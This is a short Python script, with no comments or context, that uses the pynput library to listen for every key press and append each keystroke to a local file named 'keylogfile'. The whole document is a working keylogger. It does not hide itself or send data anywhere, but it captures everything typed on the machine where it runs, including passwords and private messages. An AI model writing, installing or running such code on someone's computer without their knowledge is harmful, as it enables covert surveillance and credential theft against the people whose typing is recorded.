from pynput.keyboard import Listener


def writetofile(key):

    keydata = str(key)
    
    with open('keylogfile', 'a') as keylog:

        keylog.write(keydata)

with Listener(on_press=writetofile) as l:
    
    l.join()